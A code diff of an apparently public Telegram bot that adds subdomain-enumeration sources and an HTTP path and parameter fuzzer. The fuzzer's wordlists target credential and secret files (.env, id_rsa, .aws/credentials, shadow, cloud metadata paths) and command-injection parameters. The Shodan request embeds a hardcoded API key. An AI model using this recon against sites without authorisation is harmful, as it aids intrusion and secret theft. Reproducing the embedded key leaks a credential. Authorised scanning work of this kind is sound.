+    # ── v46: Additional High-Value Words ──────────────────────────
+    "vault","secrets","config","configs","configuration","settings","env",
+    "prod2","production2","live2","release","releases","hotfix","patch",
+    "preview","pre","pre-prod","preprod","ppe","rehearsal",
+    "mgmt2","ops","operations","devops","sre","platform","infra2",
+    "cloud2","k8s","kubernetes","helm","docker2","registry","harbor",
+    "nginx","apache","haproxy","traefik","istio","envoy",
+    "db2","database2","mysql2","postgres","postgresql","pg","maria","mariadb",
+    "mongo","mongodb","redis2","memcached","elasticsearch2","elastic","kibana2",
+    "minio","s3proxy","cdn2","cloudfront","fastly2","akamai2",
+    "api2","api3","api4","apiv1","apiv2","rest2","graphql2","grpc",
+    "microservice","service2","svc2","backend2","frontend","fe","be",
+    "webhook2","callback","events3","bus2","pubsub2","nats2","kafka2","mq2",
+    "reports","reporting","analytics2","bi2","tableau","metabase","redash",
+    "workspace","workspaces","tenant","tenants","org","orgs","organization",
+    "team","teams","group","groups","department","dept",
+    "partner2","vendor","vendors","supplier","suppliers","third-party",
+    "client","clients","customer","customers","account","accounts","user2","users2",
+    "employee","employees","staff","hr","finance","accounting","legal2",
+    "lab","labs","research","innovation","experiment","experiments",
+    "tools","tool","utility","utilities","resource","resources",
+    "gateway2","proxy2","router2","edge2","node3","node4",
+    "us-east","us-west","eu-west","eu-central","ap-southeast","ap-northeast",
+    "r1","r2","r3","az1","az2","az3","zone1","zone2","zone3","region1","region2",
+    "vpn2","bastion","jump","jumphost","ssh2","rdp","sftp","ftps",
+    "wss","websocket","socket2","iot","mqtt","coap",
+    "trace2","apm","rum","observability","telemetry","opentelemetry",
+    "feature2","ab","ab-test","abtest","experiment2","flag2",
+    "legal","tos2","privacy2","compliance2","gdpr2","hipaa","pci",
+    "trust","safe","secure2","shield","protect","protection","firewall",
+    "abuse2","spam","phishing","malware","threat","intel","ti",
+    "cdn3","assets3","static3","media3","files2","uploads",
+    "download","downloads","upload","share","shares","transfer","sync",
+    "backup3","archive3","disaster-recovery","dr2","bcp",
+    "test2","test3","qa2","uat2","sandbox3","demo2","trial",
+    "old","old2","legacy2","v1","v2","v3","new","new2","next2",
+    "alpha","alpha2","beta2","gamma","rc","rc1","rc2",
+    "apps2","webapp","web2","web3","mobile2","native2","hybrid",
 ]
 
+
 def _subdomains_sync(domain: str, progress_q: list) -> dict:
-    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
+    """Enumerate subdomains via 10+ sources — v46 Ultra (crt.sh, HackerTarget, AlienVault, URLScan, RapidDNS, Jldc, Anubis, DNS brute-force)."""
     results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
     found_all    = set()
 
 
-    # -- Source 1: crt.sh (Certificate Transparency) -
+    # ── Source 1: crt.sh (Certificate Transparency) ─
     progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
     try:
         r = requests.get(
@@ -7557,7 +7719,7 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"crt.sh: {e}")
 
-    # -- Source 2: HackerTarget API (free) ------------
+    # ── Source 2: HackerTarget API (free) ────────────
     progress_q.append("🔍 Querying HackerTarget API...")
     try:
         r = requests.get(
@@ -7575,7 +7737,7 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"HackerTarget: {e}")
 
-    # -- Source 3: AlienVault OTX (passive DNS) ------ ✅ V23 New
+    # ── Source 3: AlienVault OTX (passive DNS) ────── ✅ V23 New
     progress_q.append("🔍 Querying AlienVault OTX (passive DNS)...")
     try:
         r = requests.get(
@@ -7596,13 +7758,13 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"OTX: {e}")
 
-    # -- Source 5: URLScan.io -------------------------- ✅ V24 New
+    # ── Source 5: URLScan.io ────────────────────────── ✅ V24 New
     progress_q.append("🔍 Querying URLScan.io...")
     try:
         r = requests.get(
-            f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=200",
+            f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=500",
             headers={"Accept": "application/json"},
-            timeout=12
+            timeout=15
         )
         urlscan_count = 0
         if r.status_code == 200:
@@ -7623,7 +7785,7 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"URLScan: {e}")
 
-    # -- Source 6: RapidDNS --------------------------- ✅ V24 New
+    # ── Source 6: RapidDNS ─────────────────────────── ✅ V24 New
     progress_q.append("🔍 Querying RapidDNS...")
     try:
         r = requests.get(
@@ -7644,7 +7806,96 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"RapidDNS: {e}")
 
-    # -- Source 4: DNS Brute-force --------------------
+    # ── Source 7: Jldc.me (Chaos/ProjectDiscovery mirror) ──
+    progress_q.append("🔍 Querying jldc.me (chaos dataset)...")
+    try:
+        r = requests.get(
+            f"https://jldc.me/anubis/subdomains/{domain}",
+            timeout=12, headers={"Accept": "application/json"}
+        )
+        jldc_count = 0
+        if r.status_code == 200:
+            try:
+                entries = r.json()
+                if isinstance(entries, list):
+                    for h in entries:
+                        if isinstance(h, str) and h.endswith(f".{domain}") and h not in found_all:
+                            found_all.add(h)
+                            results.setdefault("jldc", []).append(h)
+                            jldc_count += 1
+            except Exception:
+                pass
+        progress_q.append(f"✅ jldc.me: `{jldc_count}` found")
+    except Exception as e:
+        results["errors"].append(f"jldc: {e}")
+
+    # ── Source 8: Anubis DB ────────────────────────────────
+    progress_q.append("🔍 Querying Anubis subdomain DB...")
+    try:
+        r = requests.get(
+            f"https://jonlu.ca/anubis/subdomains/{domain}",
+            timeout=12, headers={"Accept": "application/json"}
+        )
+        anubis_count = 0
+        if r.status_code == 200:
+            try:
+                entries = r.json()
+                if isinstance(entries, list):
+                    for h in entries:
+                        if isinstance(h, str) and h.endswith(f".{domain}") and h not in found_all:
+                            found_all.add(h)
+                            results.setdefault("anubis", []).append(h)
+                            anubis_count += 1
+            except Exception:
+                pass
+        progress_q.append(f"✅ Anubis: `{anubis_count}` found")
+    except Exception as e:
+        results["errors"].append(f"Anubis: {e}")
+
+    # ── Source 9: Subdomainfinder.c99.nl ──────────────────
+    progress_q.append("🔍 Querying c99.nl subdomain finder...")
+    try:
+        r = requests.get(
+            f"https://subdomainfinder.c99.nl/scans/{domain}",
+            timeout=12, headers={"User-Agent": "Mozilla/5.0", "Accept": "text/html"}
+        )
+        c99_count = 0
+        if r.status_code == 200:
+            for m in re.finditer(r'([a-z0-9][a-z0-9\-\.]*\.' + re.escape(domain) + r')', r.text, re.I):
+                h = m.group(1).strip().lower()
+                if h.endswith(f".{domain}") and h not in found_all:
+                    found_all.add(h)
+                    results.setdefault("c99", []).append(h)
+                    c99_count += 1
+        progress_q.append(f"✅ c99.nl: `{c99_count}` found")
+    except Exception as e:
+        results["errors"].append(f"c99: {e}")
+
+    # ── Source 10: Shodan (passive, no auth needed for subdomains) ──
+    progress_q.append("🔍 Querying Shodan passive DNS...")
+    try:
+        r = requests.get(
+            f"https://api.shodan.io/dns/domain/{domain}?key=PSKINdQe1GyxGgecYz2191H2JoS9qvgD",
+            timeout=12, headers={"Accept": "application/json"}
+        )
+        shodan_count = 0
+        if r.status_code == 200:
+            try:
+                data_sh = r.json()
+                for sub in data_sh.get("subdomains", []):
+                    if isinstance(sub, str) and sub:
+                        h = f"{sub}.{domain}".lower()
+                        if h not in found_all:
+                            found_all.add(h)
+                            results.setdefault("shodan", []).append(h)
+                            shodan_count += 1
+            except Exception:
+                pass
+        progress_q.append(f"✅ Shodan: `{shodan_count}` found")
+    except Exception as e:
+        results["errors"].append(f"Shodan: {e}")
+
+    # ── Source 4: DNS Brute-force ────────────────────
     progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
     live_subs  = []
     wildcard_ip = None
@@ -7653,7 +7904,7 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     try:
         wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
         wildcard_ip = wc_ip
-        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`)   filtering...")
+        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
     except socket.gaierror:
         pass
 
@@ -7668,11 +7919,11 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
         except socket.gaierror:
             return None
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as ex:
         futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
         done = 0
         try:
-            for fut in concurrent.futures.as_completed(futs, timeout=40):
+            for fut in concurrent.futures.as_completed(futs, timeout=60):
                 done += 1
                 if done % 50 == 0:
                     progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
@@ -7687,12 +7938,12 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
         except concurrent.futures.TimeoutError:
             for f in futs:
                 f.cancel()
-            progress_q.append(f"⚠️ DNS brute-force timeout   partial: `{done}/{len(_SUBDOMAIN_WORDLIST)}` | `{len(live_subs)}` live")
+            progress_q.append(f"⚠️ DNS brute-force timeout — partial: `{done}/{len(_SUBDOMAIN_WORDLIST)}` | `{len(live_subs)}` live")
 
     results["bruteforce"] = live_subs
     progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")
 
-    # -- Deduplicate and resolve all found ------------
+    # ── Deduplicate and resolve all found ────────────
     all_unique = sorted(found_all)
     resolved   = {}
     for h in all_unique[:100]:
@@ -7701,8 +7952,8 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
         except Exception:
             resolved[h] = "unresolved"
 
-    # -- HTTP live check + page title fetch ----------  ✅ V23 Enhanced
-    progress_q.append(f"🌐 HTTP live check + title fetch for top `{min(20, len(all_unique))}` subdomains...")
+    # ── HTTP live check + page title fetch ──────────  ✅ V23 Enhanced
+    progress_q.append(f"🌐 HTTP live check + title fetch for top `{min(60, len(all_unique))}` subdomains...")
     http_status: dict = {}
 
     # ✅ V23: Interesting subdomain keywords to highlight
@@ -7742,8 +7993,8 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
                 continue
         return hostname, None, None, "", False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-        http_futs = {ex.submit(_http_check, h): h for h in all_unique[:20]}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
+        http_futs = {ex.submit(_http_check, h): h for h in all_unique[:60]}
         try:
             for fut in concurrent.futures.as_completed(http_futs, timeout=30):
                 try:
@@ -7772,17 +8023,17 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
 
 
 async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/subdomains <domain> - Advanced subdomain enumeration"""
+    """/subdomains <domain> — Advanced subdomain enumeration"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/subdomains example.com`\n\n"
             "📡 *6 sources combined:*\n"
-            "  ① crt.sh   Certificate Transparency logs (passive)\n"
-            "  ② HackerTarget API   public dataset\n"
-            "  ③ AlienVault OTX   passive DNS\n"
-            "  ④ URLScan.io   crawl history\n"
-            "  ⑤ RapidDNS   DNS history\n"
-            f"  ⑥ DNS brute-force   {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
+            "  ① crt.sh — Certificate Transparency logs (passive)\n"
+            "  ② HackerTarget API — public dataset\n"
+            "  ③ AlienVault OTX — passive DNS\n"
+            "  ④ URLScan.io — crawl history\n"
+            "  ⑤ RapidDNS — DNS history\n"
+            f"  ⑥ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
             "🛡 Wildcard DNS auto-detection & filtering\n"
             "📦 Exports full list as `.txt` + `.json` files",
             parse_mode='Markdown'
@@ -7796,7 +8047,7 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Subdomain scan")
@@ -7821,10 +8072,10 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
             return
     except socket.gaierror:
-        pass  # domain may not have A record   still continue
+        pass  # domain may not have A record — still continue
 
     msg = await update.effective_message.reply_text(
-        f"📡 *Subdomain Enumeration   `{raw}`*\n\n"
+        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
         f"① crt.sh  ② HackerTarget  ③ AlienVault OTX\n"
         f"④ URLScan.io  ⑤ RapidDNS\n"
         f"⑥ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
@@ -7871,8 +8122,8 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
     interesting_subs = data.get("interesting", [])
 
     lines = [
-        f"📡 *Subdomain Enumeration   `{raw}`*",
-        "--------------------",
+        f"📡 *Subdomain Enumeration — `{raw}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"🔎 Total unique: `{total}`",
         f"  crt.sh:       `{crtsh_c}`",
         f"  HackerTarget: `{ht_c}`",
@@ -7892,7 +8143,7 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
             scheme  = st_info.get("scheme", "https")
             status  = st_info.get("status", "?")
             title   = st_info.get("title", "")
-            title_str = f"   _{title}_" if title else ""
+            title_str = f" — _{title}_" if title else ""
             lines.append(f"  🔴 `{h}` [{scheme.upper()} {status}]{title_str}")
         lines.append("")
 
@@ -7915,7 +8166,7 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lines.append("")
 
         if other_http:
-            lines.append(f"*📡 DNS Only   No HTTP ({len(other_http)}):*")
+            lines.append(f"*📡 DNS Only — No HTTP ({len(other_http)}):*")
             for h in other_http[:15]:
                 ip   = resolved.get(h, "?")
                 flag = ""
@@ -7934,7 +8185,7 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
-    # -- Export files ----------------------------------
+    # ── Export files ──────────────────────────────────
     import io
     txt_content  = "\n".join(
         f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
@@ -7973,7 +8224,7 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
         document=zip_buf,
         filename=f"subdomains_{safe_d}_{ts}.zip",
         caption=(
-            f"📡 *Subdomains   `{raw}`*\n"
+            f"📡 *Subdomains — `{raw}`*\n"
             f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
             f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
         ),
@@ -7981,12 +8232,12 @@ async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ==================================================
-# 🧪  /fuzz   HTTP Path & Parameter Fuzzer
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
+# ══════════════════════════════════════════════════
 
 _FUZZ_PATHS = [
-    # -- Admin / Login / Dashboard ------------------
+    # ── Admin / Login / Dashboard ──────────────────
     "admin","admin/","administrator","admin.php","admin/login","admin/login.php",
     "admin/index.php","admin/dashboard","admin/panel","admin/console",
     "admin/users","admin/settings","admin/config","admin/api",
@@ -7995,11 +8246,11 @@ _FUZZ_PATHS = [
     "cpanel","whm","plesk","directadmin","webmin","webadmin",
     "wp-admin","wp-admin/","wp-login.php","wp-login",
     "portal","console","controlpanel","backoffice","backend",
-    # -- Debug / Dev --------------------------------
+    # ── Debug / Dev ────────────────────────────────
     "debug","debug.php","debug/","test","test.php","testing","dev","devel",
     "development","staging","beta","alpha","old","demo","sandbox","lab",
     "trace","profiler","xdebug","phpstorm","ide","editor",
-    # -- Backup / Dump files ------------------------
+    # ── Backup / Dump files ────────────────────────
     "backup","backup/","backup.zip","backup.tar","backup.tar.gz","backup.sql",
     "backup.bak","dump.sql","db.sql","db.zip","database.sql","database.bak",
     "site.zip","site.tar.gz","full_backup.zip","files.zip","www.zip",
@@ -8007,7 +8258,7 @@ _FUZZ_PATHS = [
     "config.php.bak","config.bak","wp-config.php.bak","web.config.bak",
     "data.sql","data.dump","schema.sql","export.sql","mysql.sql",
     "2023_backup.sql","2024_backup.sql","backup_old.zip","old_site.zip",
-    # -- Environment / Config files -----------------
+    # ── Environment / Config files ─────────────────
     ".env",".env.bak",".env.old",".env.example",".env.sample",
     ".env.local",".env.development",".env.production",".env.staging",
     ".env.test",".env.docker","env.txt","environment.txt",
@@ -8019,7 +8270,7 @@ _FUZZ_PATHS = [
     "application.properties","application.yml","application.yaml",
     "appsettings.json","web.config","app.config","app.conf",
     ".htpasswd",".htaccess","nginx.conf","apache.conf","httpd.conf",
-    # -- Info disclosure ----------------------------
+    # ── Info disclosure ────────────────────────────
     "info.php","phpinfo.php","phpinfo","php_info.php","server-info",
     "server-status","nginx_status","mod_status","status","health",
     "health/","healthcheck","ping","ping/","version","build","build-info",
@@ -8027,13 +8278,13 @@ _FUZZ_PATHS = [
     "actuator/info","actuator/env","actuator/beans","actuator/mappings",
     "actuator/metrics","actuator/loggers","actuator/threaddump",
     "metrics","prometheus","stats","diagnostics","diagnostic",
-    # -- Source / VCS leaks -------------------------
+    # ── Source / VCS leaks ─────────────────────────
     ".git",".git/","git/config",".git/config",".git/HEAD",".git/FETCH_HEAD",
     ".git/index",".git/logs/HEAD",".git/refs/heads/master",
     ".git/refs/heads/main",".svn",".svn/entries",".hg",".hg/store",
     ".bzr","CVS","CVS/Entries",".gitignore",".gitattributes",
     "web.config","web.config.bak","crossdomain.xml","clientaccesspolicy.xml",
-    # -- Robots / Sitemaps / Well-known ------------
+    # ── Robots / Sitemaps / Well-known ────────────
     "robots.txt","sitemap.xml","sitemap_index.xml","sitemap-news.xml",
     "sitemap-video.xml","sitemap-image.xml","news-sitemap.xml",
     "humans.txt","security.txt",".well-known/security.txt",
@@ -8041,7 +8292,7 @@ _FUZZ_PATHS = [
     ".well-known/change-password",".well-known/assetlinks.json",
     "readme.md","README.md","README.txt","CHANGELOG.md","CHANGELOG.txt",
     "LICENSE","LICENSE.md","Dockerfile","docker-compose.yml",
-    # -- CMS specific -------------------------------
+    # ── CMS specific ───────────────────────────────
     "wp-config.php","xmlrpc.php","wp-json","wp-cron.php",
     "wp-content/debug.log","wp-content/uploads/","wp-content/plugins/",
     "wp-includes/","wp-json/wp/v2/users",
@@ -8050,62 +8301,62 @@ _FUZZ_PATHS = [
     "config/database.yml","app/etc/config.php","app/etc/env.php",
     "includes/config.php","includes/configure.php",
     "catalogue/","catalog/","store/","shop/",
-    # -- API / GraphQL / Docs -----------------------
+    # ── API / GraphQL / Docs ───────────────────────
     "api","api/","api/v1","api/v2","api/v3","api/v4",
     "api/users","api/admin","api/auth","api/login","api/register",
     "graphql","graphql/","graphiql","api/graphql",
     "swagger.json","openapi.json","openapi.yaml","swagger.yaml",
     "api-docs","swagger-ui.html","swagger-ui","redoc","docs",
     "v1","v2","v3","rest","rest/api","jsonapi",
-    # -- Logs / Monitoring -------------------------
+    # ── Logs / Monitoring ─────────────────────────
     "error.log","access.log","debug.log","app.log","laravel.log",
     "server.log","application.log","system.log","install.log","update.log",
     "storage/logs/laravel.log","storage/logs/","logs/","log/",
     "logs/error.log","logs/debug.log","logs/app.log","var/log/app.log",
     "tmp/logs/","tmp/log/","temp/log/",
-    # -- Common dirs / uploads ---------------------
+    # ── Common dirs / uploads ─────────────────────
     "uploads","uploads/","files","files/","static","static/","assets","assets/",
     "media","media/","public","public/","private","private/",
     "download","downloads","export","exports","report","reports",
     "images","img","js","css","fonts","font","data","dist","build",
     "tmp","temp","cache","sessions","storage","vendor","node_modules",
-    # -- DevOps / Cloud -----------------------------
+    # ── DevOps / Cloud ─────────────────────────────
     "jenkins","jenkins/","gitlab","gitlab/","jira","confluence","sonar",
     "nexus","artifactory","registry","harbor","rancher","portainer",
     "grafana","kibana","prometheus","alertmanager","elastic","logstash",
     "phpmyadmin","phpmyadmin/","adminer.php","adminer","pgadmin",
     "mongo-express","redis-commander","flower","celery",
     "k8s","kubernetes","consul","vault","nomad",
-    # -- Hidden / Sensitive files -------------------
+    # ── Hidden / Sensitive files ───────────────────
     "id_rsa","id_rsa.pub","authorized_keys","known_hosts","ssh_host_rsa_key",
     "passwd","shadow","hosts","resolv.conf","sudoers",
     "aws/credentials",".aws/credentials",".aws/config",
     "boto.cfg",".boto",".netrc",".npmrc",".pypirc",".docker/config.json",
     "terraform.tfvars","terraform.tfstate","terraform.tfstate.backup",
     "Jenkinsfile","Makefile","Vagrantfile","Procfile",
-    # -- Spring Boot / Java -------------------------
+    # ── Spring Boot / Java ─────────────────────────
     "h2-console","h2-console/","jolokia","jolokia/","hawtio","hawtio/",
     "druid","druid/","druid/index.html","index.action",
     "hystrix.stream","turbine.stream",
-    # -- Laravel / PHP ------------------------------
+    # ── Laravel / PHP ──────────────────────────────
     "telescope","telescope/","horizon","horizon/","telescope/api/requests",
     "horizon/api/stats","debugbar","_debugbar","_ignition",
     "clockwork","clockwork/",
-    # -- Python / Django / Flask --------------------
+    # ── Python / Django / Flask ────────────────────
     "django-admin","admin/doc/","silk/","silk/api/","rosetta/",
     "__pycache__/","__debug__/","werkzeug",
-    # -- Node.js ------------------------------------
+    # ── Node.js ────────────────────────────────────
     ".nvmrc",".node-version","package-lock.json","yarn.lock","pnpm-lock.yaml",
     "node_modules/.package-lock.json",
-    # -- Ruby on Rails -----------------------------
+    # ── Ruby on Rails ─────────────────────────────
     "rails/info/properties","rails/mailers","sidekiq","sidekiq/",
     "letter_opener","flipper","flipper/api",
-    # -- AWS / Cloud --------------------------------
+    # ── AWS / Cloud ────────────────────────────────
     "latest/meta-data/","latest/user-data/",
     "_ah/health","_ah/warmup",  # GCP App Engine
     "healthz","readyz","livez",  # k8s
     "__version__","__heartbeat__","__lbheartbeat__",
-    # -- V24: Additional sensitive paths ---------------
+    # ── V24: Additional sensitive paths ───────────────
     "api/private","api/internal","api/secret","api/hidden",
     "api/test","api/dev","api/beta","api/debug","api/sandbox",
     "internal","internal/","internal/api","internal/admin",
@@ -8152,54 +8403,54 @@ _FUZZ_PATHS = [
 ]
 
 _FUZZ_PARAMS = [
-    # -- Common / IDOR ------------------------------
+    # ── Common / IDOR ──────────────────────────────
     "id","uid","user_id","userid","account_id","order_id","product_id",
     "item_id","post_id","page_id","category_id","group_id","org_id",
     "file_id","doc_id","ref","reference","record","object","resource",
-    # -- Input / Injection -------------------------
+    # ── Input / Injection ─────────────────────────
     "q","query","search","keyword","term","text","input","data","payload",
     "cmd","exec","command","run","shell","eval","expression","code",
     "sql","filter","where","sort","order","by","limit","offset","page","per_page",
-    # -- File / Path --------------------------------
+    # ── File / Path ────────────────────────────────
     "file","filename","filepath","path","dir","directory","folder",
     "url","uri","link","href","src","source","include","require","load",
     "template","view","layout","page","module","component","class",
     "redirect","next","return","return_url","callback","goto","continue",
     "back","redir","destination","target","forward","location",
-    # -- User ---------------------------------------
+    # ── User ───────────────────────────────────────
     "user","username","uname","name","email","mail","login","password",
     "pass","passwd","pwd","new_password","confirm_password",
     "first_name","last_name","fullname","display_name","nickname",
-    # -- Auth / Session -----------------------------
+    # ── Auth / Session ─────────────────────────────
     "token","access_token","refresh_token","auth_token","session_token",
     "api_key","apikey","key","secret","secret_key","private_key",
     "client_id","client_secret","app_id","app_key","app_secret",
     "code","state","nonce","csrf","_csrf","csrf_token","xsrf",
     "hash","sig","signature","hmac","digest","checksum",
     "session","session_id","sid","auth","authorization","bearer",
-    # -- Admin / Priv -------------------------------
+    # ── Admin / Priv ───────────────────────────────
     "admin","is_admin","role","roles","permissions","privilege","level",
     "debug","test","dev","internal","hidden","mode","flag","feature",
     "bypass","skip","override","force","sudo",
-    # -- Format / Output ----------------------------
+    # ── Format / Output ────────────────────────────
     "format","output","type","content_type","accept","lang","language",
     "locale","timezone","tz","charset","encoding","version","v",
     "fields","columns","attributes","expand","include","exclude","select",
     "action","method","op","operation","task","job","event","trigger",
-    # -- Tracking ----------------------------------
+    # ── Tracking ──────────────────────────────────
     "utm_source","utm_medium","utm_campaign","ref","referrer","aff",
     "affiliate","promo","coupon","voucher","discount",
 ]
 
 def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
-    """Run path or parameter fuzzing - profile-aware wordlist & delay."""
+    """Run path or parameter fuzzing — profile-aware wordlist & delay."""
     found = []
 
-    # -- Reuse or build SiteProfile ----------------
+    # ── Reuse or build SiteProfile ────────────────
     domain  = urlparse(base).netloc
     profile = _PROFILE_CACHE.get(domain) or detect_site_profile(base)
 
-    # -- Profile-aware wordlist + settings ---------
+    # ── Profile-aware wordlist + settings ─────────
     fuzz_workers = 15
     fuzz_delay   = 0.0
 
@@ -8236,7 +8487,7 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
             "service-worker.js", "manifest.json", "robots.txt",
         ]
 
-    # Build final wordlist   CMS-specific paths first
+    # Build final wordlist — CMS-specific paths first
     if mode == "params":
         wordlist = _FUZZ_PARAMS
         targets  = [f"{base}?{p}=FUZZ" for p in wordlist]
@@ -8251,7 +8502,7 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         + (f" | `{fuzz_delay}s` delay" if fuzz_delay else "")
     )
 
-    # -- Baseline: get 404 fingerprint ---------------
+    # ── Baseline: get 404 fingerprint ───────────────
     try:
         r404 = requests.get(
             base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
@@ -8319,14 +8570,14 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         except concurrent.futures.TimeoutError:
             for f in fmap:
                 f.cancel()
-            progress_q.append(f"⚠️ Fuzz timeout   partial: `{done}/{len(targets)}` | `{len(found)}` found")
+            progress_q.append(f"⚠️ Fuzz timeout — partial: `{done}/{len(targets)}` | `{len(found)}` found")
 
     found.sort(key=lambda x: (x["status"] != 200, x["status"]))
     return found, baseline_status
 
 
 async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/fuzz <url> [paths|params] - HTTP path & parameter fuzzer"""
+    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
     if not await check_force_join(update, context):
         return
     uid = update.effective_user.id
@@ -8336,15 +8587,15 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Fuzzing")
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:*\n"
-            f"`/fuzz https://example.com`   Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
-            f"`/fuzz https://example.com params`   Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
+            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
+            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
             "🧪 *Path mode detects:*\n"
             "  • Hidden admin panels & login pages\n"
             "  • Backup & config files (.env, .sql, .bak)\n"
@@ -8431,12 +8682,12 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     lines = [
-        f"🧪 *Fuzz Results   `{domain}`* [{mode}]",
+        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
         f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
     ]
 
     if not found:
-        lines.append("🔒 Nothing found   well hardened!")
+        lines.append("🔒 Nothing found — well hardened!")
     else:
         # Categorize
         critical = [r for r in found if r["status"] == 200 and
@@ -8466,7 +8717,7 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines.append("\n⚠️ _Passive fuzzing. No exploitation._")
 
-    # -- Always export JSON report ------------------
+    # ── Always export JSON report ──────────────────
     import io as _io
     report = json.dumps({
         "target": url, "mode": mode, "domain": domain,
@@ -8498,7 +8749,7 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         document=buf,
         filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
         caption=(
-            f"🧪 *Fuzz Report   `{domain}`* [{mode}]\n"
+            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
             f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
             f"Wordlist: `{len(wordlist)}` entries"
         ),
@@ -8506,11 +8757,11 @@ async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ==================================================
-# 📢  FEATURE 8   Force Join Channel (Must-Sub)
-# ==================================================
+# ══════════════════════════════════════════════════
+# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
+# ══════════════════════════════════════════════════
 # DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
-# Admin IDs always bypass   no check needed.
+# Admin IDs always bypass — no check needed.
 
 async def _get_force_channels(db: dict) -> list:
